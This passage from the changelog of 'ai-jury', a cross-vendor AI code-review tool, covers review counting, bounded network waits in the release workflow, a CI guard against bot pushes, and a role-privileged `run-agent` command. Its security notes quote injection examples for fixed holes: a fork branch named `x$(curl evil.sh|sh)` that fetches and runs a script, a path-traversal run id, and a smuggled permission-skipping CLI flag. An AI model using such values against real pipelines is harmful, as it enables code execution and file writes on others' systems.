  - **An abstention is not a review either — and that was the half the count still got wrong.** Recording the abstention did not stop it being counted: `panel.review_count` counted any seat that had *returned output*, so three replies of `Looks good to me, no concerns.` — each an `ABSTAIN` with a deliberately anchorless scope, each refused by the consumer's own `review-verdict-insubstantial` rule — satisfied `--min-reviews 3` and exited `0`. The run announced three reviews and shipped a bundle carrying none, which is #699's mismatch with the abstention wearing the review's clothes. `panel.is_review` is now the **one** definition — a `panelist` record with a substantive scope and a voting verdict — and every count in the tool resolves to it: the pre-run line, both halves of the `min_reviews` gate, the markdown report, `panel.reviews_supplied` in the metadata, the chair record's `reviews_supplied`, and `--doctor`'s ceiling. Each ballot carries the two facts it reads (`scope_substantive`, `verdict`) and its answer (`counts_as_review`), so the consumer need not re-derive anything.
  - **A seat that returned nothing is named rather than dropped.** `reviewer_ballots` started from the seats that had produced output, so an agent that ran and came back empty left *no entry at all* and the report could not say which of the three had gone quiet — the bundle was simply one shorter than the bench. Every seat that ran now gets a record: an abstention naming the agent and which kind of nothing came back (a failed adapter, an empty reply, a refusal, or a reply that named nowhere), visible in both the `reviewers` array and the `keel-reviews` bundle, and excluded from the count by the rule above. The pre-run announcement says `at most N` in consequence, because a seat is a seat that *might* review.
  - **A claim is a scope only under `--issue`.** `describe_scope` fell back to the reviewer's claims whenever its findings carried no file, and `_tick` backticked each one — which is an anchor under the substance rule. So a code-review ballot raising one `major` finding against `file: ""` produced a scope that passed the gate and a verdict of `REQUEST_CHANGES`, having named no file, line or symbol at all. keel's rule is that a scope names a place or carries a `Checked …` clause, and a claim is neither. Issue mode is the one legitimate exception and stays: there a finding carries an empty `file` by construction, because the panel is reading an issue's prose rather than a diff, so the claims are the only thing it can name. In code-review mode that ballot abstains, and the reason says which of the two happened — "said nothing" reads differently from "raised findings and attached none of them to a file".
  - **`model_source` rides along in the `keel-reviews` bundle too.** `model` changed meaning in this same release — a CLI default is now an English sentence rather than `""` — and only the JSON report grew the machine token that tells the two apart. The bundle is the shape a consumer actually parses, so it carries `model_source` as well, along with `counts_as_review`.
  - **Every abstaining seat is counted under the cause its own ballot states.** `metadata.panel_accounting` derived `insubstantial` by subtraction — `ballots - silent - reviews_supplied` — which was exact arithmetic and, from the round above, a false description: once a ballot could carry a substantive scope and still abstain, the remainder also held the seat that opened `Checked: src/a.py` and then refused, and the one whose adapter died holding a file name. Both were then rendered, in the two places a human reads the number, as *named nothing checkable* — a cause the ballot beside it flatly contradicts. Each seat is now classified by the cause its record carries, in one place (`panel.abstention_buckets`), into four buckets — `silent`, `named_nothing`, `refused`, `adapter_failed` — and the markdown report's *reviews for a downstream consumer* line and the `--min-reviews` failure message both render from those buckets and from one table of phrases, so the two cannot describe the same seat differently. The buckets and `reviews_supplied` sum to `ballots` in every run shape, which subtraction could neither state nor violate. Each ballot carries its cause in `abstention_cause`, because the record alone cannot recover it: a seat that fell silent and one that answered without naming anything leave the same `round1_ok`/`scope_substantive` behind.
  - JSON report `schema_version` goes to **1.2**. Additive but for two changes of meaning, which is why it is a bump: a consumer testing `reviewers[].model == ""` to detect the CLI-default case reads `model_source == "cli_default"` instead, and one counting the non-`chair` entries as reviews reads `counts_as_review` — the array now carries an entry per seat that *ran*, abstentions included. Every top-level key, and every other `reviewers` key, keeps its name and meaning. Run metadata stays at **5**; its `panel` block gains `silent`, `insubstantial`, `refused` and `adapter_failed`, and `reviews_supplied` is `null` when the ballots were not supplied to `panel_accounting` rather than being guessed from the raw results — every guess available over-counts, and so does every subtraction. `insubstantial` means exactly *answered and named nothing checkable* and nothing else; the three causes it briefly absorbed have buckets of their own, and all four are `null` without the ballots for the same reason `reviews_supplied` is (`silent` excepted: the raw results answer it, on the same predicate the ballots do). `reviewers[]` gains `abstention_cause` in the same bump.

- **The number of reviews the panel hands on is now stated, and the chair's role in it is no longer a guess** (#699). A machine with the three shipped CLIs ran the panel, `jury --doctor` reported `cross-vendor ready: yes`, the run exited `0` — and the consumer refused the bundle with *supplied 2 review(s) but tier requires at least 3*. Nothing anywhere in the tool had ever stated the number a consumer counts.
  - **A review is a ballot.** The consumer splits the report's `reviewers` array on `role`: the `chair` entry is the panel's consensus record and every other entry is a ballot, and only the ballots are counted against its minimum. So an *n*-agent bench supplies **at most** *n* reviews — see #700 below, which narrowed "a ballot" to "a ballot that named what it read" — and that is now the number ai-jury announces everywhere. The chair's synthesis record is carried beside them and never added to the count — doing so would advertise one review more than the consumer will find, which is the same mismatch from the other side.
  - **The chairing agent sits on the panel, and always did.** `resolve_chair` only ever picks from the *usable* agents and round 1 runs every usable agent, so that agent reviews on every code path. Its ballot is an ordinary `panelist` record with no chair role, distinct from the synthesis entry, and the count includes it. What was missing was any statement of that — the trailing `chair` record was indistinguishable from a synthesis-only entry, so a reader deciding what it was had nothing to decide on.
  - The chair record now names the agent that chaired, says where that agent's own ballot is in the bundle — or that it cast none, when it ran and returned nothing, which is the observed case — and says that the synthesis record is not itself a review. The ballot cast by the chairing agent says so on its own `scope` too, because a consumer that posts one head-pinned verdict per review shows that text alone, with no chair record beside it — and it says whichever of the two is true, read off `counts_as_review` rather than off "did a scope come back", so a chaired seat that names a file and then refuses reads *this ballot abstained … so it is NOT one of the panel's reviews* instead of claiming a review the count denies. The JSON report's `reviewers` array carries the same facts structurally: `role` on every entry, `chaired` on each panelist, and `agent` / `ballot_counted` / `reviews_supplied` on the chair's.
  - The run announces the count **before** round 1 (`panel: 3 available agent(s) → at most 3 review(s) for a downstream consumer …, plus 1 chair synthesis record (not counted as a review)`), the markdown report repeats it with the number actually supplied and the chair's role, and `jury --doctor` reports it beside cross-vendor readiness as an explicit upper bound — `cross-vendor ready: yes` was a true answer to a different question, and a bench with nothing reachable now announces `at most 0` instead of `at most 1`.
  - Rejected: enlarging the shipped default bench. It makes the arithmetic bigger while leaving the number just as unknowable, and ships a bench a normal machine cannot run.
  - Run metadata `schema_version` goes to **5** and the doctor export's `panel` block gains three keys. Both are purely additive — every existing key keeps its name and meaning — so the doctor export stays `ai-jury.doctor.v1`.
- **The formula render no longer races PyPI's index** (#694): cutting `v1.16.0`, `publish.yml` uploaded both distributions and then failed in *Render the Homebrew formula from the published sdist* with `StopIteration` followed by `curl: (3) URL rejected: Malformed input to a URL function`. PyPI had accepted the upload and its version endpoint answered, but the `urls` array in that answer did not yet list the files, so `next(f for f in urls if f['packagetype'] == 'sdist')` raised, the url stayed empty and `curl` was handed the empty string.
  - That step runs **after** the upload and **before** the GitHub Release, so the failure produced the worst intermediate state this chain can reach: 1.16.0 live on PyPI with no GitHub release at all — therefore no `releases/latest/download/ai-jury.rb` — while the tap correctly kept serving 1.15.1. Re-running the failed job recovered it, but a release should not need a person to notice.
  - **The wait asked the wrong question.** There already was one, and it was already five minutes: it polled until the version endpoint answered, which on 1.16.0 it already did. What had not converged was the file list *inside* the answer. `.github/scripts/wait-for-pypi-dists.sh` waits on that file list instead — until **both** the sdist and the wheel appear — and writes the sdist's own url and sha256 to `published-sdist.txt` for the render to read.
  - **One implementation, three call sites.** `verify` already had a wait of exactly this shape, so that poll *is* this script rather than a second one beside it: `publish.yml` runs it from the render step in `build-n-publish` and from both the index wait and the formula check in `verify`, and the two hand-rolled `packagetype` reads are gone from the workflow entirely. `verify` gets it through a **sparse, non-cone** `actions/checkout` of `.github/scripts` alone — that job's point is to install what the index serves rather than what a checkout holds, so the package source stays off its runner. Cone mode would not have done it: it materialises every root file whatever the pattern says, including `jury.toml`, which `jury --doctor` discovers from the working directory two steps later.
  - **Bounded in wall time, not only in attempts.** Thirty attempts is not five minutes if one of them can never return: a response that stalls *after* the connection is accepted holds an attempt-only poll open for as long as the peer keeps the socket. Every request now carries `--connect-timeout` and `--max-time`, `--max-time` is clamped to the budget still unspent, and `PYPI_BUDGET_SECONDS` (default `attempts × interval` = 300s) ends the poll whatever the network does. The five minutes in the header is a ceiling rather than an estimate.
  - **And so is everything else `publish.yml` asks of the network.** Bounding the poll left the defect one line down: the render step downloaded the sdist the poll had just named with a bare `curl -fsSL "$sdist_url"`, so an index that converges normally and a file server that accepts the connection and never writes left the step running with no formula and no bound but the job's — the same half-made release, reached slowly rather than quickly. `verify` had the identical download. Both now carry a connect timeout and a maximum time (`SDIST_CONNECT_TIMEOUT`/`SDIST_MAX_TIME`, defaulting to 10s and 120s). pip needed the same correction for a subtler reason: its `--timeout` is a *socket* timeout, bounding one quiet read rather than the call, so a peer that drips a byte inside every window held the six-attempt resolve loop open indefinitely — the scan called those calls bounded while the ceiling's sum counted them as zero. Every `pip install` is wrapped in `timeout` now, which is both a real bound and a countable one, every `pip` install is wrapped in `timeout`, and every `gh` call — the tap push, its readback, the release download, the tap poll and the issue this job files when a release breaks — is wrapped in `timeout`, which is the only bound `gh` accepts. The tap poll needed it most: ten attempts is not 150 seconds when the first request can never return.
  - **A job-level ceiling under all of it, and above the bounds it backs.** Both jobs now set `timeout-minutes` (30 for `build-n-publish`, 45 for `verify`). It is a backstop rather than the mechanism — a job stopped this way is *cancelled*, so `verify`'s `if: failure()` step does not run and no `release-broken` issue is opened — but it caps the five actions the workflow `uses:`, whose HTTP is their own, and the next unbounded command as well as the ones already found. Without it the ceiling was GitHub's six-hour default, in a job that sits between a PyPI upload and the GitHub Release.
    - `verify`'s first ceiling was **below** the bounds it was backing: the shared wait is called twice (a 300s budget each, plus the request in flight when it runs out and the sleep after it), the pip loop allows 6 × (`timeout 90` + `sleep 10`), the sdist download 120s, `gh release download` 120s, the tap poll 10 × `timeout 30` plus 10 × `sleep 15`, and the failure report three `timeout 60` `gh` calls — about 2220s against a 1200s ceiling. A job spending its own deadlines honestly would have been cancelled rather than failed, which for this job means no `release-broken` issue for a release that is already public. The comment above the ceiling listed three of those waits and the test asserted the same three numbers, so neither could catch the other; the test now recomputes the sum from the workflow text — every `timeout`, every `--max-time`, every `sleep` multiplied by its loop's iteration count, and the shared wait's own budget — for every job the file declares.
  - **`--max-time 0` is refused rather than passed to curl.** `${SDIST_MAX_TIME:-120}` substitutes only when the variable is unset or *empty*, and curl reads `0` as "no limit" — so an explicit zero reached the download as the unbounded request the bound exists to remove. `wait-for-pypi-dists.sh` already refused a zero `PYPI_MAX_TIME` for exactly this reason; both copies of the sdist download now refuse one too, before the request is made.
  - **The scan reads the block-scalar spellings of a `run:`, and every job.** It decided a step's body had begun by comparing the line to `"run: |"`. YAML writes the same block six other ways — `|-`, `|+`, `>`, `>-`, `>+`, and any of those with an indentation indicator — and GitHub accepts all of them; against an equality test each of those collected *nothing*, so every assertion in the module passed on a step it had never read. A step spelled `run: >-` holding an unbounded `curl`, an unbounded `gh api` and `git push origin HEAD:main || true` left the whole module green. The header is now a pattern, the job list is read from the file rather than hardcoded — a third job would have escaped both the network scan and the ceiling check — and a non-expanding heredoc's body is skipped in all three of bash's spellings for one — `<<'EOF'`, `<<"EOF"` and `<<\EOF` — since a tool name inside one is a word in a document rather than a request. It is not every spelling of a `run:`, and the list of what it misses was itself short by two: a step written as a list item (`- run: |`) matched none of the reader's patterns and was scanned to nothing, and a plain scalar continued over several lines was collected by its first line alone — read in half, which is worse, because the half that is dropped can be the half that carries the request. Both are read now (#697). What is left is refused rather than skipped: a quoted flow scalar, a block header with a trailing comment, and a value on the following line are legal YAML that Actions runs and that reading needs a parser rather than a pattern, so `NoWorkflowSpellsARunTheScanCannotRead` fails on any of the three in any workflow instead of this file claiming to cover them.
  - **A test that says "every request" now reads every request.** The one that claimed it greps the wait script, which is exactly why the unbounded download beside it survived a round of review; it has been renamed to the file it reads. `tests/test_publish_release_chain.py` now lexes both jobs' `run:` blocks — quote-aware, so `;` inside an `::error::` message does not invent a command and the Markdown in the issue body is not read as a `pip install` — finds every command that opens a connection, and requires a bound on each. Its own mutation tests put the unbounded `curl` and an unwrapped `gh` back and require the scan to name them.
  - **A configuration mistake is diagnosed as one.** A non-numeric `PYPI_ATTEMPTS` used to die at `$((attempts * interval))` with `lots: unbound variable` — a shell error, under `set -u`, about a variable nobody set, printed before any message of the script's own. An unusable `PYPI_PYTHON` used to make every file-list read exit 127, which the loop reported as an unreadable file list: a missing interpreter spent the whole budget and then accused PyPI. Both are now named, and refused before the first request.
  - **The failure message is the thing a maintainer reads first.** An index that genuinely never converges now ends the job with `::error::PyPI never served ai-jury <version>: missing sdist after 30 attempts over 300s`, naming the version and the distribution, followed by the endpoint to check and the fact that re-running is the recovery — not a Python traceback and a malformed-URL error. Nothing is rendered or published from a partial answer, an sdist listed without a url or a digest counts as not served, and a 503 page where JSON was expected is diagnosed rather than raised.
  - No change to what the formula contains: still the published sdist's own url and digest, re-downloaded and confirmed against what PyPI reported.
  - Tested by running the extracted shell against a stub index on loopback whose answers are scripted (`tests/test_pypi_index_wait.py`) — including the exact answer that broke the release, a 200 with an empty `urls` — since a workflow that only truly runs on a tag cannot be exercised in the suite.

### Security
- **The release tooling is hash-locked** (#712). `publish.yml` installed `build` and `cyclonedx-bom` — the tools that produce the wheel, the sdist and the SBOM every release attests to — as whatever PyPI served at tag time. They now come from `.github/requirements/publish-tools.txt` with `--require-hashes --only-binary=:all:`, the full dependency closure pinned to the release runtime (ubuntu-latest, Python 3.13), and pip is no longer upgraded on the way. A `Release lockfiles resolve` CI job dry-runs the lock on every pull request, so a pin the index no longer serves fails there rather than during a release, and Dependabot watches the file so the pins keep moving. The `pip install -e ".[dev]"` lines in CI and the pages build are untouched: an editable install of this project with floating dev extras, not the release path.

## [1.16.0] - 2026-09-04

### Added
- **A CI guard for a bot push landing on top of a human push** (#676): on 2026-09-03 the reviewed head of #648 — a Bolt-owned branch — was rebased onto `main` by the maintainer, who then added a test of their own. Bolt pushed once more on top of that from its own stale checkout, and the push replaced the tree with the bot's old copy (25 files, 2,491 deletions), silently reverting two already-merged pull requests. The suite went red, but nothing named the cause, and on a smaller bot pull request the same shape would have gone green and shipped the revert.
  - The policy is now written down in `CONTRIBUTING.md`: **a bot-owned pull request branch is a read-only input**. Reviewed changes are re-landed on a fresh `fix/`, `perf/` or `docs/` branch cut from `main`, and the bot's pull request is closed with a link to the replacement.
  - `scripts/bot_push_after_human_push_check.py` enforces the half of that a machine can see, as the `Bot push guard` job in `ci.yml`: on a bot-owned branch it fails the run when a bot commit follows a human commit, naming the last human commit and the first bot commit after it in the job summary — the two that bracket the overwrite.
  - **Not by the pushing account.** Bolt, Palette and Sentinel commit through the GitHub API *as the repository owner*: on #648 every commit, the bot's and the human's alike, carries the login `berkayturanci`, so an account-based guard sees four human commits and passes. What separates them is the branch (`bolt-…`, `palette/…`, `sentinel/…`, `dependabot/…`), the subject marker each bot stamps (`⚡ Bolt:`, `🎨 Palette:`, `🛡️ Sentinel:`), and — for the ones that have their own account — the account. Branches a person drives from a working copy (`claude/…`, `codex/…`) are deliberately outside the rule.
  - A merge from the base branch counts as neither: `Merge branch 'main' into <bot-branch>` is the routine "Update branch" click, it carries no work of its own, and treating it as a human push would fire the guard on most of the bot pull requests in the history. A commit whose subject is a later bot commit's subject with the marker taken off is that bot's own unmarked first push (#632), not a person's.
  - Calibrated against all 114 bot-owned pull requests in this repository's history, where it fires on two: #648 itself, and #631, where a Sentinel push landed on top of a maintainer's `sec(cli)` fix in the same shape. Within the bound below it errs toward firing — a false positive costs one re-land on a fresh branch, which is what the policy asks for anyway, and a false negative costs a silent revert nobody sees. A guard that cannot read the pull request exits 2 rather than reporting a pass; an unwritable step summary warns and leaves the verdict alone, since exiting non-zero out of a passing run would read exactly like a hit.
  - **Its accuracy is bounded by the marker convention, not by the rule**, and the docstring says so: where the bots push under the maintainer's account the subject prefix is the only thing separating their commits from a person's, so an unmarked bot push reads as human (one branch-wide pass recovers the common case, where the same change is later re-pushed *with* the marker; nothing recovers the rest) and a human subject opening with a bot's name reads as a bot. A rebase is only visible where the bot has its own account. A merge is judged by its subject, because the API reports a first-parent diff for a clean merge exactly as for a hand-resolved one — verified on the clean `Merge branch 'main' into sentinel/…` at 92a1d481, which reports 4 files and +252/-58 — so only a merge *of the base branch* is excused, and the three merges in the corpus whose subjects show a hand resolution now register as human touches.
  - **No event data reaches the job's shell.** A `${{ }}` expression inside `run:` is substituted into the script source before bash parses it, and a pull request branch name is attacker-chosen on a fork — git permits `$( )`, backticks and quotes inside a ref, so a branch called `x$(curl evil.sh|sh)` would have executed arbitrary shell in this job on **every** pull request. The repository, the PR number and both refs now travel through `env:` and are referenced as `"$HEAD_REF"` and friends. The offline suite asserts the rule rather than the instance: the job's `run:` block must contain no `${{` at all.
  - The base-branch merge exemption is applied **after** the bot signals, not before: a push made *as* a merge of the base (`Merge branch 'main' into bolt-x`, two parents, authored by a bot account) was being excused as routine — the incident's own shape in a routine costume. And the merged-in ref is compared against an explicit set — the base plus its `origin/` and `upstream/` spellings — instead of by its last path segment, so `Merge branch 'topic/main' into bolt-x` is somebody's topic branch again rather than the base.
  - **The job is not self-enforcing, and branch protection has to finish the job.** On a `pull_request` event GitHub runs the workflow from the pull request's own head, so a stale bot push that predates the guard — 28d9cc3c on #648 deleted 25 files, two workflows among them — removes the job and no check run is created for it at all. No code in this repository can prevent that. The operator must add **`Bot push guard`** to `main`'s required status checks, where a context that never reports blocks the merge; the job's name is frozen once it is registered there, since renaming it leaves the old context required and never reported. Recorded in `CONTRIBUTING.md` and in the job's own comment.
- **`jury run-agent`: one agent, one role, one JSON result** (#661): ai-jury already owned the transport-agnostic provider runtime an orchestrator needs — an adapter per vendor, per-vendor `available()`, the read-only flags, timeouts, the typed `ERR_*` taxonomy — but it was reachable only through a full panel run. So an orchestrator dispatching a *single* implementer, gate reviewer or chair had to re-implement the argv itself, which is exactly where a read-only guarantee gets lost. On a live keel run on 2026-09-03 the orchestrating agent hand-wrote `agy --model gemini-3.8-flash-high` with stream-json stdin and a 60-minute timeout, because nothing exposed the adapter.
  - `jury run-agent --agent <name|vendor[:model]> --role implement|review|gate|chair|fix --prompt-file <path>` prints exactly one `ai-jury.run-agent.v1` document on stdout — `ok`, `agent`, `vendor`, `model`, `role`, `transport`, `text`, `exit_code`, `duration_s`, `timed_out`, `error_code`, `error`, `attribution` — with progress on stderr, as a panel run does. `--format text` prints only the agent's text. Exit `0` ran and produced output, `1` ran and failed, `2` the request was refused.
  - **The role decides privilege, and no flag overrides that.** `review`/`gate`/`chair` always get the vendor's existing read-only invocation — byte-identical to what a panel review sends — and `--allow-write` on them warns and is **ignored**: those roles read attacker-controlled content, and a reviewer that becomes write-capable by way of a flag is the whole failure `privilege.py` exists to prevent. `implement`/`fix` are the only write-capable roles, and only with an explicit `--allow-write`; without it the command exits 2 rather than quietly running a read-only agent and reporting work that never happened.
  - The write mode is `privilege.enable_write`, the deliberate mirror of `enforce_read_only` and the only place the guarantee is lifted: claude drops `--disallowed-tools`, codex moves to `-s workspace-write`, agy drops the boolean `--sandbox`, and network vendors are untouched because they have no tool surface in either direction. It is reached through one new adapter seam, `build_argv_for_role(prompt, policy)`, whose `policy=None` case — every existing call site — resolves to the unchanged `build_argv`. A test asserts that byte-for-byte, so the panel path could not have moved.
  - **`--detach` / `--wait <id>` / `--status`** for work that outlives a shell. A detached run writes `<cache-dir>/run-agent/<run-id>.json` (0600, in a 0700 directory — it holds the agent's full output, which is derived from the prompt) with the child's console log beside it, and `--wait` polls it through an injected clock, so the lifecycle is unit-tested against a fake one rather than real seconds. Run ids are validated as filenames, so `--run-id ../escape` is refused rather than written.
  - `AgentResult` now carries the child's real `exit_code` instead of leaving it to be parsed back out of the error string. A bare built-in vendor works with no `jury.toml` at all, reusing the shipped default entry (including its read-only `extra_args`) so the two cannot drift; a configured `[[agent]]` of the same name still wins. A `vendor:model` suffix is validated before it is forwarded, so `claude:--dangerously-skip-permissions` is refused rather than handed to the CLI as another flag.
  - `attribution.label` is `agent:<vendor>` plus a versionless `model:<base>` from one pure `model_base()` — `claude-opus-4-5` keeps its major, `gpt-5.5` becomes `gpt-5`, `ollama:qwen2.5:7b` becomes `qwen` — so a point-release bump does not fork the attribution history of otherwise-identical work.
  - **A run id is a filename, and is checked where it becomes one.** Validating `--run-id` in the detach parent was not enough: the background child re-parses its own argv, so a traversal or absolute id handed to it wrote a 0600 file holding the agent's full output outside the cache directory (`--run-id ../../PWNED`, proven end to end). The check now lives in `runagent.run_path`, the single place an id becomes a path, so the parent, the child, `--wait` and `--status` all inherit it — plus a containment check that still refuses anything not landing directly in the runs directory, in case the pattern is ever loosened.
  - **A detached run cannot sit at `running` forever.** The initial state records the child's pid and the run's own timeout; the child writes a terminal state from its crash path as well as its success path; `--status` reports a run whose process is definitively gone as `lost`; and a bare `--wait` is bounded by the run's timeout plus a minute rather than blocking indefinitely. Liveness is probed on POSIX only — on Windows `os.kill(pid, 0)` terminates the process instead of probing it, so an unknown answer stays `running`.
  - **The parent writes the run's state file exactly once, before the spawn.** Recording the pid in a second write afterwards — from the dict the parent still held — overwrote the terminal document of a child that finished during launch, turning a real answer into `status: running`. The child claims the run with its own pid instead, so every write after the parent's lands from one process in order. An unrecorded pid reads as "liveness unknown", which is reported as `running` and never as `lost`.
  - **The liveness probe is resolved when it is called, not captured as a default argument.** `alive_fn=pid_alive` in a signature binds *this* module's function when the `def` runs, so a test patching `runagent.pid_alive` patched nothing while appearing to work — on POSIX the real probe happened to give the expected answer, so it passed for the wrong reason. On Windows, where the probe correctly answers "unknown", the same test's dead-pid shortcut never fired and its constant fake clock could never reach the deadline: an infinite spin that hung CI for an hour on every head while every other platform went green in five minutes. Both `wait_for_run` and `list_runs` now look the probe up at call time.
  - `--wait` says once, on stderr, when it cannot tell whether a run is still alive, naming which of the two causes it is: no process id recorded yet (the ordinary window between `--detach` and the child claiming the run, on any platform) or a platform that cannot check one without terminating it. Blaming the platform for an unclaimed run would be simply false on Linux and macOS. The deadline applies either way, so the wait is bounded on every platform.
  - `alive_fn=None` no longer means two opposite things one function apart — "use the default" in `wait_for_run`/`list_runs` and "do not probe" in `run_summary`. A `DEFAULT_PROBE` sentinel means the former, and `None` means "do not probe" everywhere.
  - `--wait` consults the same liveness rule `--status` does, so a run it would call `lost` returns immediately instead of blocking to the deadline for a result that is not coming. The state is re-read once before anything is declared lost: a child may finish between the read and the probe, and a real answer beats an inference about a pid.
  - `running` is documented as a claim rather than a guarantee. Pids are recycled, so a state file that outlives its process (a reboot, a shared `--cache-dir`) can name an unrelated one. The failure is one-directional on purpose — a stale pid leaves a finished run looking `running`, never a live run declared dead — and `started_at` travels with the pid so a reader can see how old the claim is.
  - `--wait-timeout` bounds the wait; `--timeout` bounds the agent. They were one overloaded flag. A `--wait` on a run that was never started is answered immediately, since `--detach` reserves the id before it returns. `--run-id` without `--detach` is now an error rather than silently ignored.
  - The attribution label is **family + major**, and the grouping is deliberately uneven — `gemini-3.8-flash-high` and `gemini-3.8-pro` both collapse to `model:gemini-3`, while `claude-opus-4-5` and `claude-opus-4-6` stay distinct. That is keel's `agents.model_base` rule byte-for-byte, because both projects label the same issues and a divergent rule would split one project's history; the `model` field carries the exact id for anyone who needs it.
  - The argv-intercept subcommands (`init`, `config`, `comment`, `apply`, `replay`, `run-agent`, `cache clear`, `examples`, `guide`) are now named in `jury --help`. They are handled before argparse runs, so it could never list them, and until now `--help` did not admit they existed.

- **`jury --doctor --json`: the panel's readiness as data, and a per-agent `effort`** (#662): `--doctor` printed a human report, so a wizard or orchestrator that wanted to know *which reviewers this machine can actually run* had to scrape it. And there was no way to ask a reviewer to think harder — every vendor spells that differently, so the answer was "edit the model id yourself, per vendor".
  - `jury --doctor --json` emits exactly **one** JSON document on stdout and nothing else — `schema_version: "ai-jury.doctor.v1"`, then `tool_version`, `python`, `config_path`, `ready`, `agents[]`, `warnings[]`. Each agent carries its `transport` (`cli` / `api` / `local`), whether it is `available` and the `reason` when it is not, the `command` **or** the `endpoint` its adapter would actually call, the resolved binary, the probed version and capability labels, discovered `models`, and its effort support. `--write` is untouched and still writes the fuller internal dict; under `--json` its confirmation line moves to stderr so stdout stays parseable.
  - **The text report and the export are one projection.** `doctor.doctor_report_dict()` is pure — it runs no probes, and both renderers consume it — so the human report and the machine export cannot describe the panel differently. Pinned by a test asserting the text reflects the exported facts, and a second pinning the schema key-by-key with types, so a shape change has to be deliberate and carry a `DOCTOR_SCHEMA_VERSION` bump.
  - **Secrets stay out.** Environment *variable names* only (`OPENAI_API_KEY is not set in the environment`), never values; userinfo credentials are stripped from every endpoint. The probes are the ones doctor already ran — `models` comes from `agy models` or a local server's `/v1/models`, both time-boxed and fail-soft to `null`, because a diagnostics command must never hang or crash.
  - **`[[agent]] effort = "low"|"medium"|"high"` and `--effort` for a whole run.** The vendor mapping lives in exactly one pure function (`adapters.effort_args`): agy appends a model-id suffix (`gemini-3.8-flash` + `high` → `gemini-3.8-flash-high`, and a model that already carries one is left alone); `anthropic-api` enables extended thinking at 2048/8192/32768 tokens; `openai-api` and `openai-compatible` send `reasoning_effort`; `google-api` sends `generationConfig.thinkingConfig.thinkingBudget`. Verified against the installed `agy`, whose own `models` listing is exactly `…-high` / `…-medium` / `…-low`.
  - Anthropic's `max_tokens` is **raised above the thinking budget**. Thinking tokens are drawn from the same allowance, so leaving it at 4096 with a 32768-token budget would have produced a request the API rejects — a mapping that looks right in a unit test and fails on the first real call.
  - **`local` is deliberately not mapped**, even though it speaks OpenAI-compatible JSON: many local servers reject an unknown request field outright, which would turn an optional hint into a failed review. It warns and is ignored, like the `claude`/`codex` CLIs, which have no headless effort control at all.
  - An unsupported vendor warns **once per run** on stderr, not once per invocation — a three-round panel repeating the same line nine times is how a real warning gets scrolled past. An unknown level (`effort = "maximum"`) is a **hard config error**: silently paying for a shallower run than you asked for is the worse failure.
  - `jury init`'s interactive flow asks for a level (skippable) and records it only on agents whose vendor can act on it; every other effort-capable agent gets a commented `# effort = "medium"` hint, so the setting is discoverable from the generated file. The hint is deliberately absent under `claude`/`codex`, where uncommenting it would only ever produce a warning. The guided `--wizard` question set is unchanged.
  - Effort is part of the config hash, so two runs that differ only by effort do not share a cache entry.
  - Model discovery is opt-in (`build_diagnostics(probe_models=...)`), set only by `--json`. It is the one probe the text report never renders, and running it there cost a subprocess per agy agent and an HTTP round trip per local agent for a field nobody printed — measured 0.11 s -> 2.3 s with a single agy agent, and up to the probe timeout if the CLI hangs.
  - The Anthropic `high` budget is clamped to 27904 so `max_tokens` stays at or below 32000: per-model caps vary and the nominal 32768 plus the response allowance would build a request some models reject. The invariant `budget < max_tokens <= ceiling` is enforced at the request boundary too, so it holds for any plan.
  - An agy model id is checked against `agy models` when that listing can be discovered: a `-high` variant the CLI does not have falls back to the configured id and warns, instead of sending an unknown model and losing that reviewer's whole review. An undiscoverable listing is treated as "unknown", never as "absent".
  - **The export names an environment variable; it never carries one's value.** CodeQL (`py/clear-text-logging-sensitive-data`) traced a flow into the new `--doctor --json` print, from `[[agent]] api_key_env` — a field whose *name* matches the credential heuristic while its *value* is an env var name. The finding was a false positive about the data and a true one about the code: an operator-supplied string was being echoed verbatim into a JSON document.
    - `redaction.safe_env_var_name` now rebuilds that name character by character out of a module constant, so only `[A-Za-z_][A-Za-z0-9_]*` can reach an export or a report and nothing derived from the config field survives into one. A malformed name falls back to the vendor default — and `validate_config` warns, so the fallback is not silent.
    - The internal accessor and constant were renamed (`_api_key_env`/`_API_KEY_ENV` -> `_env_var_name`/`_ENV_VAR_NAME`): they hold public configuration, and a credential-shaped name on a non-credential is how both a reader and an analyzer misread this path. `_api_key()` **keeps** its sensitive name — it really does hold the secret, and nothing renders it. The public `[[agent]] api_key_env` config key is unchanged.
    - The `--config-validate` warning that reports a malformed `api_key_env` does **not** quote the value back. Reaching that branch means it holds characters outside the safe set — exactly the class (control characters, ANSI escapes, quotes) that must not reach a terminal. Naming the agent and stating the rule locates the problem without reproducing it. CodeQL flagged this second echo once the first was fixed, and it was right both times.
    - Fixed by construction, not by a suppression comment. Pinned by tests asserting a real credential never reaches the export, the text report, or the `--write` dict, and that a name carrying `", "injected":` or a newline cannot reshape either output.
- **Adapter contract probes that run without auth, network or spend** (#682): the product claim is a cross-vendor jury, and until now nothing on a pull request could tell whether one had actually happened. `jury --doctor` answers "is the CLI on `PATH`, does it exit 0" — which was true, and green, throughout #635, while `agy` 1.1's new `--print` arity killed the invocation in the launcher and the panel silently ran on one vendor for a whole release. The tests that would have caught it existed (`tests/live/`) and are excluded from CI for a good reason: they cost real model calls. So the hole was never that nobody tested the adapters, it was that the only test of the *invocation* needed a wallet.
  - `tests/test_adapter_contracts.py` drives every shipped adapter's **real** argv builder, stdin encoder and stdout parser — `claude`, `codex`, `agy` and `GenericCLIAdapter` in both prompt modes — against recorded CLI responses in `tests/fixtures/contracts/`, with a recorder standing in for `_spawn` so what would have been executed is captured exactly. No subprocess, no network, no key: it runs on every matrix leg, on every pull request.
  - The invocation shape is locked in `tests/golden/adapter_contracts.json` — argv, write-argv, stdin mode, sandbox flags, and whether the prompt is allowed anywhere near argv (#287). It is hand-maintained on purpose: a golden regenerated from the code under test asserts nothing. Changing it is a *vendor* change and is expected to arrive with a note here saying which CLI changed and what it was verified against. A registered vendor with no locked contract fails the suite, so the next adapter cannot ship in the state #635 shipped in. Two entries lock a spec whose `extra_args` is **empty**, which is what makes the sandbox assertion mean anything: every other locked spec supplies its own sandbox flags, so the check could only ever prove they were echoed back — with an empty config the same assertion proves the adapter ADDS the read-only sandbox (#288). Replacing `_read_only_extra_args` with a pass-through now fails the contract module; before, it did not.
